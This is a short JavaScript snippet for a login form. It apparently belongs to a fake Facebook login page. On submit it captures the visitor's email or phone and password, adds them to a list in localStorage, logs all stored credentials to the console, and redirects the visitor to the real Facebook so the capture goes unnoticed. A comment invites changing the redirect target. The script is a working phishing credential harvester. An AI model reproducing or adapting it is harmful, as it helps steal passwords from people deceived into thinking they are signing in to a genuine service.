document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const emailOrPhone = document.getElementById('emailOrPhone').value;
    const password = document.getElementById('password').value;
    const loginDetails = { emailOrPhone, password, timestamp: new Date().toLocaleString() };

    let allLoginDetails = JSON.parse(localStorage.getItem('allLoginDetails')) || [];
    allLoginDetails.push(loginDetails);
    localStorage.setItem('allLoginDetails', JSON.stringify(allLoginDetails));

    console.log('Saved login details:', allLoginDetails);

    window.location.href = 'https://web.facebook.com/?_rdc=1&_rdr'; // Change this URL to the desired redirection site
});